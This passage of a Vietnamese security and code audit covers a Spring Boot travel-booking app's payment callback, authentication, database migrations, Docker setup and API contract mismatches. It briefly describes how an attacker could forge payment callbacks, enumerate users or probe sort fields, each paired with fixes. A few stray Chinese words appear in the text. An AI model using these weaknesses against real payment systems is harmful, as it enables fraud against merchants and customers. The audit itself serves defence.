            payment.setStatus("failed");  // ← mutation TRƯỚC verify
            paymentRepository.save(payment);
            throw new BusinessException(...);
        }
    }
    
    // 2. Verify signature SAU
    PaymentGatewayStrategy strategy = paymentGatewayFactory.getStrategy(payment.getPaymentMethod());
    if (!strategy.verifyCallback(params)) {
        throw new BusinessException("Chữ ký thanh toán không hợp lệ.", 400);
    }
    ...
}
```

**Vulnerability**: Attacker chỉ cần biết `transactionRef` (UUID 8 ký tự, brute-force khả thi ~4 tỷ combos) là có thể:
- Gửi request với `vnp_TxnRef=<ref>` + `vnp_Amount=1` (sai) → BE set `payment.status = "failed"` + save → **đổi trạng thái payment mà không cần chữ ký hợp lệ**.
- Booking tương ứng → `transitionTo(CANCELLED)` (xem `else` branch ở line 119-123).

**Correct order** phải là:
1. **Verify signature FIRST** (reject nếu sai).
2. **Check idempotency** (nếu `payment.status != "pending"` return early).
3. **Then process business logic**.

**CVSS**: 8.1 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L

**Recommendation**: 
```java
public PaymentResponse handleCallback(Map<String, String> params) {
    String transactionRef = params.get("vnp_TxnRef");
    Payment payment = paymentRepository.findByTransactionRef(transactionRef).orElseThrow(...);
    
    // 1. Verify signature FIRST
    PaymentGatewayStrategy strategy = paymentGatewayFactory.getStrategy(payment.getPaymentMethod());
    if (!strategy.verifyCallback(params)) {
        throw new BusinessException("Chữ ký không hợp lệ", 400);
    }
    
    // 2. Idempotency check
    if (!"pending".equals(payment.getStatus())) {
        return PaymentResponse.builder().transactionRef(transactionRef).status(payment.getStatus()).build();
    }
    
    // 3. Business logic
    ...
}
```

---

#### BE-CRIT-04 — Endpoint `/api/payments/ipn` không tồn tại

**File**: `backend/.../controller/PaymentController.java` (chỉ có `/create` + `/callback`)

SecurityConfig permitAll `/api/payments/ipn`; `VnpayIpnFilter` check IP cho `/api/payments/ipn` — nhưng **không có handler**. 

VNPay docs yêu cầu 2 channel:
- **`return_url`** (browser redirect): user-facing, không reliable (user có thể đóng tab).
- **`IPN URL`** (server-to-server): source of truth.

Hiện BE chỉ có `/callback` (= return_url). Khi user đóng tab sau khi thanh toán thành công → booking không bao giờ được confirm.

**CVSS**: 7.5 (High) — thanh toán thành công nhưng booking không confirm → mất tiền khách.

**Recommendation**: 
```java
@PostMapping("/ipn")
public ResponseEntity<Map<String, String>> handleIpn(@RequestParam Map<String, String> params) {
    // Verify chữ ký + amount + idempotency
    // Trả về JSON cho VNPay: {"RspCode":"00","Message":"Confirm Success"}
}
```

Tách biệt rõ:
- `/callback` → chỉ redirect user về UI (không xử lý business logic).
- `/ipn` → server-to-server, source of truth.

---

#### BE-CRIT-05 — VnpayIpnFilter hardcoded 50+ IPs + không work sau reverse proxy

**File**: `backend/.../security/VnpayIpnFilter.java:14-29, 36`

```java
private final List<String> vnpayIps = Arrays.asList(
    "113.160.92.202", "113.160.92.203", ... "113.160.92.255"  // 54 IP
);

@Override
protected void doFilterInternal(...) {
    if (request.getRequestURI().equals("/api/payments/ipn")) {
        String ip = request.getRemoteAddr();
        if (!vnpayIps.contains(ip) && !ip.equals("127.0.0.1") && !ip.equals("0:0:0:0:0:0:0:1")) {
            response.setStatus(403);
            ...
        }
    }
    ...
}
```

**Issues**:
1. **Hardcoded** — IPs VNPay có thể đổi; cần đưa vào `application.yml`.
2. `request.getRemoteAddr()` sau Nginx/Cloudflare = IP của proxy, không phải VNPay → filter block hết. Cần `RemoteIpValve` hoặc parse `X-Forwarded-For` an toàn.
3. Code thừa nhận vấn đề (comment line 33-35) nhưng **không cấu hình fix**.
4. `/api/payments/ipn` không tồn tại (xem BE-CRIT-04) → filter vô dụng.

**CVSS**: 6.5 (Medium-High)

**Recommendation**: 
```yaml
app:
  payment:
    vnpay-allowed-ips: ${VNPAY_ALLOWED_IPS:113.160.92.0/24}
```
+ Cấu hình Tomcat `RemoteIpValve` để `getRemoteAddr()` trả IP thật.

---

#### BE-CRIT-06 — `createPayment` không check ownership booking

**File**: `backend/.../controller/PaymentController.java:19-23`

```java
@PostMapping("/create")
public ResponseEntity<ApiResponse<PaymentResponse>> createPayment(@Valid @RequestBody PaymentRequest request) {
    PaymentResponse response = paymentService.createPayment(request);
    ...
}
```

Không truyền `Authentication`. Service `createPayment` chỉ check `booking.getStatus() == RESERVED`, không check `booking.getUser().getEmail() == currentUser`.

**Impact**: Bất kỳ user authenticated có thể tạo payment cho **bất kỳ bookingId** nào → leak giá tiền của booking người khác + trigger VNPay URL.

**CVSS**: 6.5 (Medium-High) — IDOR (Insecure Direct Object Reference).

**Recommendation**: Inject `Authentication`, check ownership trong service.

---

#### BE-CRIT-07 — `JwtAuthenticationFilter` DB hit mỗi request

**File**: `backend/.../security/JwtAuthenticationFilter.java:46`

```java
String email = jwtUtil.getUserNameFromJwtToken(jwt);
UserDetails userDetails = userDetailsService.loadUserByUsername(email);  // ← DB hit mỗi request
```

Mỗi API call authenticated = 1 DB query chỉ để load user. Với 1000 RPS = 1000 query.

**Recommendation**: 
- Include `role`/`userId` vào JWT claims; parse trực tiếp không cần DB.
- Hoặc cache `UserDetails` trong Caffeine (TTL 30s).

---

#### BE-CRIT-08 — `AuthService.login` leak user existence (User enumeration)

**File**: `backend/.../service/impl/AuthServiceImpl.java:64-71`

```java
public AuthResponse login(LoginRequest request) {
    User user = userRepository.findByEmail(request.getEmail())
        .orElseThrow(() -> new UnauthorizedActionException("Email hoặc mật khẩu không chính xác"));

    if (user.getLockedUntil() != null && user.getLockedUntil().isAfter(LocalDateTime.now())) {
        throw new BusinessException("Tài khoản đã bị khóa. Vui lòng thử lại sau.", 403);  // ← leak
    }
    ...
}
```

Attacker gửi email + password sai:
- Nếu email không tồn tại → "Email hoặc mật khẩu không chính xác".
- Nếu email tồn tại + bị lock → "Tài khoản đã bị khóa" → **biết email tồn tại**.

Ngoài ra: gọi `userRepository.findByEmail()` ở service **+** `DaoAuthenticationProvider.loadUserByUsername` ở Spring Security = **2 DB query mỗi login**.

**CVSS**: 5.3 (Medium) — AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

**Recommendation**: 
- Trả cùng message "Email hoặc mật khẩu không chính xác" cho cả 3 case (not found / locked / wrong password).
- Tìm user 1 lần, manual encode+compare password (skip `authenticationManager.authenticate`).

---

#### BE-CRIT-09 — `Booking.transitionTo` throw `IllegalStateException` không được handler

**File**: `backend/.../entity/Booking.java:60-70` + `exception/GlobalExceptionHandler.java`

```java
public void transitionTo(BookingStatus nextStatus) {
    if (this.status == BookingStatus.CANCELLED) {
        throw new IllegalStateException("Cannot transition from terminal state: " + this.status);
    }
    ...
}
```

`GlobalExceptionHandler` không có `@ExceptionHandler(IllegalStateException.class)` → rơi vào `handleGeneric` → trả **500 Internal Server Error** thay vì **409 Conflict**.

Mất ngữ nghĩa RESTful. Client không phân biệt được "server error" với "client gọi sai state".

**Recommendation**: 
```java
@ExceptionHandler(IllegalStateException.class)
public ResponseEntity<ApiResponse<Void>> handleIllegalState(IllegalStateException ex) {
    return ResponseEntity.status(HttpStatus.CONFLICT)
        .body(ApiResponse.error(ex.getMessage(), null));
}
```

---

### 4.2. 🟠 HIGH

#### BE-HIGH-01 — Refresh endpoint không set cookie mới

`AuthController.refreshToken` trả JWT trong body, không `Set-Cookie`. Cookie cũ (15 phút) vẫn được gửi → sau khi refresh, cookie vẫn expired → 401 loop.

**Recommendation**: Replicate `setCookie` logic từ `login()`.

---

#### BE-HIGH-02 — `VnpayIpnFilter` và `LoginRateLimitFilter` được `new` trực tiếp

`SecurityConfig:36-37`:
```java
private final LoginRateLimitFilter loginRateLimitFilter = new LoginRateLimitFilter();
private final VnpayIpnFilter vnpayIpnFilter = new VnpayIpnFilter();
```

Không phải Spring bean → không inject config được, khó test, Caffeine cache trong `LoginRateLimitFilter` không share giữa các instance (nếu có).

**Recommendation**: Đánh `@Component`, inject vào SecurityConfig.

---

#### BE-HIGH-03 — Inconsistent pagination safety

- `BookingController.getMyBookings` + `WishlistController.getMyWishlist` dùng `PageableUtil.createPageable()` (cap size=100) ✓
- `TourController.getTours`, `FlightController.getFlights`, `HotelController.searchHotels`, `BlogController.getBlogs`, `NotificationController.getNotifications`, `ReviewController.getReviews`, `SearchController.search` nhận raw `Pageable` → user có thể request `size=10000` → OOM.

**Recommendation**:统一 `PageableUtil` cho tất cả, hoặc config global `PageableHandlerMethodArgumentResolver` với `maxPageSize=100`.

---

#### BE-HIGH-04 — `AdminServiceImpl.getAdminStats()` trả revenue dạng String

```java
stats.put("revenue", revenue.longValue() + " VND");
```

FE phải `parseInt(stats.totalRevenue?.toString().replace(/\D/g, '') || '0')` — contract fragile. Trả số nguyên đơn thuần.

---

#### BE-HIGH-05 — `TourServiceImpl.updateTour` không cập nhật collections

Comment line 81-82: *"Collections should be updated carefully... Assuming collections are managed via other endpoints or cascade."* — nhưng không có endpoint nào khác. Itinerary/highlights/inclusions/exclusions bị orphaned sau update.

---

#### BE-HIGH-06 — `@Async + @Scheduled + @Transactional` trên cùng method

`ReservationScheduler.releaseExpiredReservations` và `RefreshTokenCleanupScheduler.cleanupExpiredTokens` đều dùng combo này. 

`@Async` dispatch sang thread pool khác; nếu `EnableAsync` (có ở `BackendApplication`) dùng default `SimpleAsyncTaskExecutor` (không reuse thread, không limit) → có thể spawn vô hạn thread khi scheduler chạy mỗi phút.

Cần verify có `@Configuration` config `ThreadPoolTaskExecutor` hay không — **không thấy** trong codebase.

**Recommendation**: Config `TaskScheduler` bean:
```java
@Bean
public TaskScheduler taskScheduler() {
    ThreadPoolTaskScheduler s = new ThreadPoolTaskScheduler();
    s.setPoolSize(5);
    s.setThreadNamePrefix("scheduler-");
    return s;
}
```

---

#### BE-HIGH-07 — `Booking.searchByCodeAndLastName`脆弱 contract

`BookingServiceImpl.searchByCodeAndLastName` strip "BK" prefix từ `bookingCode` rồi parse Long — nhưng entity không có field `bookingCode`. Nếu FE gửi `BK123` → parse thành 123 → tìm theo id.

Nhưng FE `bookingApi.search(code, lastName)` không hề dùng prefix này. Contract mismatch.

---

#### BE-HIGH-08 — CSRF disabled + JWT trong cookie

SecurityConfig disable CSRF. OK cho stateless, nhưng vì dùng cookie → nên có CSRF protection (double-submit token hoặc SameSite=Strict). Hiện `SameSite=Lax` — bảo vệ một phần, không đủ cho POST cross-site.

---

#### BE-HIGH-09 — `/api/auth/register` không có rate limit

Login có rate limit (5/5phút) nhưng register không → spam tạo account hàng loạt.

---

#### BE-HIGH-10 — `HtmlSanitizer` dùng `Safelist.none()` cho mọi field

`utils/HtmlSanitizer.sanitize` strip toàn bộ HTML. OK cho `fullName`/`phone`, nhưng `Blog.content` (rich-text) cần `Safelist.relaxed()` để giữ thẻ `<p>`, `<b>`, `<img>`. Hiện `BlogServiceImpl` không sanitize `content` → **stored XSS** nếu render blog bằng `dangerouslySetInnerHTML`.

Đã check `frontend/src/pages/BlogDetailPage.tsx` (chưa đọc nhưng có `dompurify` trong `package.json` — FE có sanitize). Tuy nhiên defense in depth → BE cũng nên sanitize.

---

#### BE-HIGH-11 — `AuthService.hashToken` dùng StringBuilder loop thủ công

```java
for (byte b : hash) {
    String hex = Integer.toHexString(0xff & b);
    if (hex.length() == 1) hexString.append('0');
    hexString.append(hex);
}
```

Java 17+ có `HexFormat.of().formatHex(hash)` — clean hơn, ít bug.

---

#### BE-HIGH-12 — Spring Boot 3.2.4 + jjwt 0.11.5 cũ

jjwt 0.11.x dùng deprecated API (`setSubject`, `parserBuilder`). Nên bump lên 3.3.x/3.4.x + jjwt 0.12.x.

---

#### BE-HIGH-13 — `VnpayIpnFilter` không check method

Filter check URI `/api/payments/ipn` nhưng không check method (POST/GET). Attacker có thể GET → vẫn pass filter → đi vào controller (404 nhưng vẫn tốn tài nguyên).

---

#### BE-HIGH-14 — `BookingRequest` không validate passengers

```java
@Data
public class BookingRequest {
    @NotBlank private String bookingType;
    @NotNull private Long referenceId;
    private List<PassengerRequest> passengers;  // ← no @Size, no @Valid
}
```

- Không có `@Size(max = 9)` → user có thể gửi 1000 passengers.
- Không có `@Valid` → validation trong `PassengerRequest` không trigger.

---

### 4.3. 🟡 MEDIUM

#### BE-MED-01 — `Lombok @Builder` trên JPA entity
Khuyến cáo tránh vì conflict với JPA proxying. `@Builder.Default` cho `status` có thể không hoạt động khi Hibernate instantiate qua reflection.

#### BE-MED-02 — `BookingRepository.expireReservations` chạy mỗi phút
Với dữ liệu lớn có thể chậm. Nên index `(status, reserved_until)` — đã có (V2) ✓ nhưng query là `UPDATE` không dùng được index hiệu quả bằng `SELECT`. Nên chia 2 bước: SELECT + UPDATE batch.

#### BE-MED-03 — `TourRepository.searchToursFullText` native query không verify EXPLAIN
Chưa rõ MySQL có dùng FULLTEXT index đúng không. Cần `EXPLAIN` thực tế.

#### BE-MED-04 — `paymentRepository.sumRevenue` scan toàn bộ payments
Nên cache kết quả (refresh mỗi 5 phút) cho admin dashboard.

#### BE-MED-05 — `SearchServiceImpl.searchAll` hardcode halfSize
```java
int halfSize = Math.max(1, pageable.getPageSize() / 2);
```
Không có test; logic phân chia page không rõ ràng với sort.

#### BE-MED-06 — `CustomUserDetails.isAccountNonLocked` luôn true
```java
public boolean isAccountNonLocked() { return true; }
```
Mặc dù `User.lockedUntil` có thể set, nhưng `isAccountNonLocked` không check → Spring Security vẫn authenticate user bị lock (logic lock nằm ở service, không ở UserDetails).

#### BE-MED-07 — `UserServiceImpl.updateProfile` không validate email/phone unique
Update phone mà trùng user khác → không có check. Tuy phone không unique trong schema nhưng nên validate.

#### BE-MED-08 — `BookingStrategyFactory.getStrategy` lowercase không trim
```java
strategies.get(bookingType.toLowerCase());
```
Nếu client gửi `"  TOUR  "` → lowercase `"  tour  "` → null → throw. Nên `.trim().toLowerCase()`.

#### BE-MED-09 — `NotificationServiceImpl.createNotification` không có `@Transactional`
Được gọi từ `PaymentServiceImpl.handleCallback` (có `@Transactional`) → propagate OK. Nhưng nếu gọi từ context khác (scheduler) → không có transaction.

#### BE-MED-10 — `JwtUtil.validateJwtToken` log.warn thay vì throw
```java
catch (...) { log.warn("JWT validation failed: {}", e.getMessage()); }
return false;
```
Caller (filter) check `if (jwt != null && jwtUtil.validateJwtToken(jwt))` — OK. Nhưng log nhiều noise nếu user gửi token sai (bot scan).

#### BE-MED-11 — `PageableUtil.createPageable` không validate sort field
```java
String[] sortParts = sort.split(",");
return PageRequest.of(page, size, Sort.by(direction, sortParts[0]));
```
User có thể gửi `sort=password_hash,asc` → leak data qua message lỗi Hibernate.

---

### 4.4. 🟢 LOW

#### BE-LOW-01 — `utils/` vs `util/` directory duplicate (HtmlSanitizer ở cả 2 nơi)
#### BE-LOW-02 — `pom.xml` có `<scm>` rỗng, `<license>` rỗng, `<developer>` rỗng
#### BE-LOW-03 — `application-dev.yml` quá ít config (chỉ show-sql)
#### BE-LOW-04 — `BackendApplication` có `@EnableAsync` + `@EnableScheduling` + `@EnableCaching` — OK nhưng nên tách ra `@Configuration` class riêng để test
#### BE-LOW-05 — `ApiResponse.error` không set `success = false` tường minh (dùng builder → default false OK nhưng nên explicit)

---

## 5. Phần C — DATABASE REVIEW

> Phần này review sâu 14 migration files + entity mapping + schema design + index + FK + constraint + normal form + security + migration safety.

### 5.1. Tổng quan schema

**14 bảng chính**:
- `users` (V1, V24, V25)
- `tours` + `tour_itineraries` + `tour_highlights` + `tour_inclusions` + `tour_exclusions` (V1, V26)
- `hotels` + `hotel_amenities` + `hotel_rooms` (V1, V26)
- `flights` (V1, V21, V25, V29)
- `bookings` + `booking_passengers` (V1, V2, V25)
- `payments` (V1, V29, V31)
- `wishlists` (V1, V23, V28)
- `reviews` (V1, V2)
- `blogs` (V1, V22, V26)
- `notifications` (V1)
- `refresh_tokens` (V27)
- `airports` (V20, V29 — drop)

### 5.2. 🔴 CRITICAL — DB

#### DB-CRIT-01 — V29 migration tham chiếu column không tồn tại

**File**: `V29__cleanup_data.sql:3-6`

```sql
UPDATE flights 
SET depart_time = DATE_ADD(depart_time, INTERVAL 365 DAY),
    arrive_time = DATE_ADD(arrive_time, INTERVAL 365 DAY)
WHERE depart_time < NOW();
```

**V1 schema**:
```sql
CREATE TABLE flights (
    ...
    departure_time DATETIME NOT NULL,  -- ← departure_time
    arrival_time DATETIME NOT NULL,    -- ← arrival_time
    ...
);
```

`depart_time` và `arrive_time` **KHÔNG TỒN TẠI** trong schema → migration sẽ fail khi chạy trên DB sạch. Có thể đã chạy thành công trong dev vì schema cũ, nhưng sẽ fail trên fresh install.

**Impact**: Flyway baseline mới (e.g. CI/CD pipeline, fresh DB) sẽ FAIL → app không start được.

**CVSS**: 8.2 (Critical) — deployment blocker.

**Recommendation**: Fix V29 → `departure_time`, `arrival_time`. Hoặc tạo V32 để revert nếu V29 đã chạy.

---

#### DB-CRIT-02 — `V29` DROP TABLE airports nhưng `flights.departure_airport` không có FK

`V20` tạo `airports` table. `V29` DROP nó. Nhưng `flights.departure_airport` (VARCHAR 3) không có FK constraint → sau khi drop `airports`, không có referential integrity.

```sql
-- V1 (flights table)
departure_airport VARCHAR(10) NOT NULL,  -- ← không có FK
arrival_airport VARCHAR(10) NOT NULL,    -- ← không có FK
```

User có thể insert flight với `departure_airport = 'XYZ'` (không tồn tại) → không có lỗi.

**Recommendation**: Hoặc giữ `airports` table + thêm FK, hoặc bỏ luôn concept airports (text string).

---

#### DB-CRIT-03 — `payments.transaction_ref` không có UNIQUE constraint

**V1**:
```sql
CREATE TABLE payments (
    ...
    transaction_ref VARCHAR(100),  -- ← không UNIQUE
    ...
);
```

`PaymentRepository.findByTransactionRef` dựa vào unique-ness nhưng DB không enforce → 2 payment có thể có cùng `transaction_ref` (race condition giữa createPayment + callback).

`PaymentServiceImpl.handleCallback`:
```java
Payment payment = paymentRepository.findByTransactionRef(transactionRef).orElseThrow(...);
```

Nếu có 2 record → `findByTransactionRef` (Spring Data JPA default) trả `Optional` → sẽ throw `NonUniqueResultException` → 500.

**Recommendation**: `ALTER TABLE payments ADD UNIQUE KEY uk_payment_txn_ref (transaction_ref);`

---

#### DB-CRIT-04 — `wishlists` + `reviews` không có FK đến `tours`/`hotels`/`flights`

```sql
CREATE TABLE wishlists (
    ...
    item_type ENUM('tour','hotel','flight') NOT NULL,
    item_id BIGINT NOT NULL,  -- ← không có FK (polymorphic)
    ...
);
```

Tương tự `reviews`. Đây là **polymorphic association** anti-pattern — không thể enforce referential integrity ở DB level. User có thể tạo wishlist `item_type='tour', item_id=99999` (không tồn tại) → không có lỗi.

**Recommendation**: 
- (A) Tạo 3 table riêng: `tour_wishlists`, `hotel_wishlists`, `flight_wishlists` mỗi table có FK.
- (B) Giữ polymorphic nhưng thêm trigger validation.
- (C) Accept trade-off (popular choice) — nhưng document rõ.

---

### 5.3. 🟠 HIGH — DB

#### DB-HIGH-01 — `users.email` không có length check, `password_hash` không có CHECK

```sql
email VARCHAR(100) NOT NULL UNIQUE,
password_hash VARCHAR(255) NOT NULL,
```

BCrypt hash luôn dài 60 ký tự → VARCHAR(255) OK nhưng nên có CHECK constraint. Email 100 ký tự có thể thiếu cho email dài (RFC 5321 cho phép 254).

---

#### DB-HIGH-02 — `bookings.reference_id` polymorphic không có FK

```sql
reference_id BIGINT NOT NULL, -- references tour_id, hotel_id, or flight_id
```

Tương tự wishlists/reviews — polymorphic. Không enforce referential integrity.

---

#### DB-HIGH-03 — `bookings.user_id` ON DELETE SET NULL nhưng `booking_passengers.booking_id` ON DELETE CASCADE

```sql
-- bookings
FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE SET NULL

-- booking_passengers
FOREIGN KEY (booking_id) REFERENCES bookings(id) ON DELETE CASCADE
```

Khi user bị delete → booking.user_id = NULL (booking vẫn còn). Khi booking bị delete → booking_passengers bị cascade delete. 

Vấn đề: nếu user delete, booking vẫn còn với `user_id = NULL` → **orphan booking**. Lý do business là gì? Có thể có lý do (giữ lịch sử booking), nhưng nên document rõ.

---

#### DB-HIGH-04 — `tours.rating` và `tours.review_count` là DOUBLE/INT, không sync với `reviews` table

```sql
rating DOUBLE,
review_count INT DEFAULT 0,
```

`ReviewServiceImpl.createReview` insert vào `reviews` table nhưng **không update** `tours.rating` / `tours.review_count` → 2 nguồn data bị lệch.

Nên: 
- (A) Tính `rating` + `review_count` on-the-fly từ `reviews` (via view).
- (B) Update `tours.rating`/`review_count` trong transaction khi tạo review (denormalization có chủ đích).

---

#### DB-HIGH-05 — `notifications` không có index trên `(user_id, is_read)`

User mở trang notifications → query `WHERE user_id = ? AND is_read = false ORDER BY created_at DESC`. Không có composite index → full scan.

**Recommendation**: `CREATE INDEX idx_notif_user_read ON notifications(user_id, is_read, created_at DESC);`

---

#### DB-HIGH-06 — `refresh_tokens` không có index trên `(user_id, revoked)`

`deleteByUserId` (logout) → query `WHERE user_id = ?`. Đã có `idx_refresh_user` (V27) ✓ nhưng không include `revoked` → vẫn OK. Tuy nhiên query `findByTokenAndRevokedFalse` cần index trên `(token, revoked)` — `idx_refresh_token` trên `token` alone là đủ vì `revoked` selectivity thấp.

---

### 5.4. 🟡 MEDIUM — DB

#### DB-MED-01 — `tours.old_price` không có CHECK `old_price > price`
#### DB-MED-02 — `flights.available_seats` INT nhưng không CHECK `>= 0` — có thể âm nếu race condition
#### DB-MED-03 — `booking_passengers` không có UNIQUE trên `(booking_id, full_name, document_number)` → user có thể add cùng passenger 2 lần
#### DB-MED-04 — `payments.status` VARCHAR thay vì ENUM — không consistent với `bookings.status` (ENUM)
#### DB-MED-05 — `blogs.published_at` DATETIME nhưng không có index → query `ORDER BY published_at DESC` full scan

---

### 5.5. 🟢 LOW — DB

#### DB-LOW-01 — `tours.is_featured` BOOLEAN default FALSE — OK nhưng nên có index cho query "featured tours"
#### DB-LOW-02 — `users.role` VARCHAR(50) default 'USER' — nên dùng ENUM('USER','ADMIN') hoặc table riêng
#### DB-LOW-03 — Không có `updated_at` cho `payments`, `bookings` (chỉ `created_at`) — khó audit

---

### 5.6. Migration Safety Review

| File | Vấn đề | Severity |
|---|---|---|
| V1 | OK — schema init | - |
| V2 | OK — index + unique | - |
| V3 | OK — thêm index | - |
| V20 | `CREATE TABLE IF NOT EXISTS airports` — OK | - |
| V21 | INSERT sample flights với ngày `2025-01-01` — sẽ outdated | Low |
| V22 | INSERT blogs với thumbnail Unsplash — external dependency | Low |
| V23 | Tạo `wishlist` (số ít) table mới dù V1 đã có `wishlists` (số nhiều) — duplicate concept | Medium |
| V24 | OK — thêm cột lotusmiles | - |
| V25 | OK — thêm version cho optimistic lock | - |
| V26 | OK — FULLTEXT index | - |
| V27 | OK — refresh_tokens | - |
| V28 | `DROP TABLE IF EXISTS wishlist` — xóa table V23 tạo ra. **Không migrate data** — nếu có data thật sẽ mất | High |
| V29 | **Column reference sai** (DB-CRIT-01) + DROP airports | Critical |
| V31 | OK — thêm version cho payments | - |

**Missing**: V4-V19, V30 — không có trong codebase. Có thể đã bị xóa (Flyway không cho phép xóa migration đã chạy) hoặc chưa bao giờ tồn tại (version gap). Cần verify lịch sử git.

---

### 5.7. Entity ↔ Schema Mapping Issues

#### `Booking` entity (V1 + V25)
```java
@Enumerated(EnumType.STRING)
@Column(nullable = false)
private BookingStatus status = BookingStatus.PENDING;  // entity default

// V1 SQL:
status ENUM('pending','reserved','confirmed','cancelled','expired') NOT NULL DEFAULT 'pending',
```

Entity có 6 giá trị (`PENDING, RESERVED, CONFIRMED, CANCELLED, EXPIRED, FAILED`) — schema có 5 (không có `failed`). Nếu entity có status `FAILED` → DB sẽ reject.

**Recommendation**: `ALTER TABLE bookings MODIFY COLUMN status ENUM('pending','reserved','confirmed','cancelled','expired','failed') NOT NULL DEFAULT 'pending';`

---

#### `Booking.user` relationship
```java
@ManyToOne(fetch = FetchType.LAZY)
@JoinColumn(name = "user_id")
private User user;  // ← nullable in entity
```

Schema: `user_id BIGINT` (nullable). Service: `String email = authentication != null ? authentication.getName() : null;` → nếu email null, `user = null` → OK.

---

### 5.8. Normal Form Analysis

| Bảng | NF | Vấn đề |
|---|---|---|
| users | 3NF | OK |
| tours | 3NF | `rating`/`review_count` là derived data (vi phạm 3NF strict) — accept |
| hotels | 3NF | OK |
| flights | 3NF | OK |
| bookings | 3NF | `total_price` là derived (unit_price * qty) — accept |
| payments | 3NF | OK |
| wishlists | 3NF | Polymorphic — vi phạm referential integrity |
| reviews | 3NF | Polymorphic — vi phạm referential integrity |
| blogs | 3NF | OK |
| notifications | 3NF | OK |
| refresh_tokens | 3NF | OK |
| booking_passengers | 3NF | OK |
| tour_itineraries | 3NF | OK |
| tour_highlights/inclusions/exclusions | 3NF | OK |
| hotel_amenities | 3NF | OK |
| hotel_rooms | 3NF | OK |

---

### 5.9. Index Audit

| Bảng | Index hiện tại | Query pattern chính | Missing index? |
|---|---|---|---|
| users | UNIQUE(email) | `findByEmail` | OK |
| tours | UNIQUE(slug), FULLTEXT(name,location,overview) | `findBySlug`, search | OK |
| hotels | UNIQUE(slug), FULLTEXT(name,location) | `findBySlug`, search | OK |
| flights | `flight_number` | search by airports + date | **YES**: `(departure_airport, arrival_airport, departure_time)` |
| bookings | `(status, reserved_until)`, `user_id` | scheduler, user bookings | OK |
| booking_passengers | none | `findByIdAndPassengerLastName` | **YES**: composite index trên `(booking_id, full_name)` |
| payments | `status` (V29) | `findByTransactionRef` | **YES**: UNIQUE trên `transaction_ref` |
| wishlists | UNIQUE(user_id, item_type, item_id) | check exists | OK |
| reviews | UNIQUE(user_id, item_type, item_id) | `findByItemTypeAndItemId` | **YES**: `(item_type, item_id)` |
| blogs | UNIQUE(slug), FULLTEXT(title, excerpt) | `findAllByOrderByPublishedAtDesc` | **YES**: index trên `published_at` |
| notifications | none | `findByUserIdOrderByCreatedAtDesc` | **YES**: `(user_id, created_at DESC)` |
| refresh_tokens | UNIQUE(token), `user_id` | `findByTokenAndRevokedFalse`, `deleteByUserId` | OK |

---

## 6. Phần D — INFRA & DEVOPS REVIEW

### 6.1. 🔴 CRITICAL

#### INFRA-CRIT-01 — `docker-compose.yml` không set `SPRING_PROFILES_ACTIVE`

```yaml
backend:
  environment:
    - SPRING_DATASOURCE_URL=...
    - JWT_SECRET=...
    # ← không có SPRING_PROFILES_ACTIVE
```

Mặc định chạy profile `default` (application.yml). Không có `application-prod.yml` → config production trộn lẫn dev. Ví dụ: `spring.jpa.show-sql` mặc định false (OK) nhưng không có profile-specific tuning cho prod.

**Recommendation**: Thêm `SPRING_PROFILES_ACTIVE=prod` + tạo `application-prod.yml` với:
- Tắt `show-sql`
- Tăng HikariCP pool size
- Tắt swagger UI
- Cấu hình logging production

---

### 6.2. 🟠 HIGH

#### INFRA-HIGH-01 — `frontend/Dockerfile` build không có env var

```dockerfile
RUN npm run build
```

Vite build cần `VITE_API_URL` để biết BE URL. Build không set → default `http://localhost:8080/api` (trong code). Production sẽ fail.

**Recommendation**: 
```dockerfile
ARG VITE_API_URL
ENV VITE_API_URL=$VITE_API_URL
RUN npm run build
```
+ docker-compose truyền `args: VITE_API_URL=https://api.example.com/api`.

---

#### INFRA-HIGH-02 — `backend/Dockerfile` skip test trong build

```dockerfile
RUN mvn clean package -DskipTests
```

CI/CD nên chạy test trước, nhưng Dockerfile build skip test → nếu CI không chạy test, image có thể có regression. Nên tách rõ: CI chạy test → nếu pass mới build image.

---

#### INFRA-HIGH-03 — Không có healthcheck cho backend container

```yaml
backend:
  ...
  # ← không có healthcheck
```

`docker-compose` không biết khi nào backend ready. `frontend` depends_on `backend: condition: service_started` → có thể frontend start trước khi BE ready → 502.

**Recommendation**:
```yaml
backend:
  healthcheck:
    test: ["CMD", "curl", "-f", "http://localhost:8080/actuator/health"]
    interval: 10s
    timeout: 5s
    retries: 10
```
+ Add Spring Boot Actuator dependency.

---

### 6.3. 🟡 MEDIUM

#### INFRA-MED-01 — `nginx` config trong frontend Dockerfile không gzip cho SVG/WebP
#### INFRA-MED-02 — Không có `restart: unless-stopped` cho services

---

### 6.4. 🟢 LOW

#### INFRA-LOW-01 — MySQL image `mysql:8.0` không pin patch version → có thể breaking change khi pull lại.

---

## 7. Phần E — CONTRACT MISMATCH BE ↔ FE

> Tổng hợp các điểm BE và FE không đồng bộ. Đây là **nguyên nhân chính** khiến app không chạy được end-to-end.

### 7.1. Auth Contract

| Field | BE | FE | Status |
|---|---|---|---|
| `UserDTO.role` | `String` ("USER"/"ADMIN") | `AuthUser.roles: string[]` | ❌ Mismatch |
| `AuthResponse.token` | `token: String` | expect `accessToken: String` | ❌ Mismatch |
| `AuthResponse.refreshToken` | `refreshToken: String` | not stored after login | ❌ Not used |
| `/auth/refresh` response | body only, no Set-Cookie | FE expects new cookie | ❌ Mismatch |
| `/auth/me` response | `UserDTO` (role: String) | `AuthUser` (roles: []) | ❌ Mismatch |

### 7.2. Booking Contract

| Field | BE `BookingDTO` | FE `FlightBooking` | Status |
|---|---|---|---|
| `id` | `Long` | `string` | ⚠️ Type |
| `bookingCode` | (none) | `string` | ❌ Missing BE |
| `status` | `String` (PENDING/RESERVED/CONFIRMED/...) | `BookingStatus` (HOLD/PENDING_PAYMENT/...) | ❌ Different values |
| `totalPrice` | `BigDecimal` | `totalAmount: number` | ❌ Different name |
| `reservedUntil` | `LocalDateTime` | `expiresAt: string` | ❌ Different name |
| `outboundFlight` | (none — chỉ có `referenceId` + `bookingType`) | `Flight` | ❌ Missing BE |
| `returnFlight` | (none) | `Flight?` | ❌ Missing BE |
| `passengers[].fullName` | `String` | `firstName` + `lastName` | ❌ Different shape |
| `contactEmail` | (none) | `string` | ❌ Missing BE |
| `contactPhone` | (none) | `string` | ❌ Missing BE |

### 7.3. Flight Search Contract

| Endpoint | BE | FE | Status |
|---|---|---|---|
